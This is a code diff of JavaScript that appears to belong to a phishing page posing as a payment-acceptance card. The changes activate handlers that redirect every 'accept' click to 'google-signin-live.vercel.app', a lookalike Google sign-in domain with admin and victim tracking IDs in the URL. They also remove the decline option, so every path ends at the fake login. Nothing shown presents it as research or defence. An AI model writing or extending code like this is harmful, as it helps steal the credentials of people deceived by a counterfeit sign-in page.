@@ -334,17 +334,17 @@
 // let x = 1;
  
  
-// document.addEventListener('click', function (e) {
+document.addEventListener('click', function (e) {
  
  
-//     document.querySelectorAll('.accept-button').forEach(button => {
-//         button.addEventListener('click', () => {
-//             window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
-//         });
-//     });
+    document.querySelectorAll('.accept-button').forEach(button => {
+        button.addEventListener('click', () => {
+            window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
+        });
+    });
  
  
-// });
+});
  
  
  
@@ -478,14 +478,16 @@ const cardHTML = `
 `;
 container.innerHTML = cardHTML;
  
-// Accept click
-document.getElementById('acceptBtn').addEventListener('click', () => {
-  window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
-});
+document.addEventListener('click', function (e) {
  
-// Decline click
-document.getElementById('declineBtn').addEventListener('click', () => {
-  alert('Payment Declined');
+ 
+    document.querySelectorAll('.accept-button').forEach(button => {
+        button.addEventListener('click', () => {
+            window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
+        });
+    });
+ 
+ 
 });
  
 // Webcam
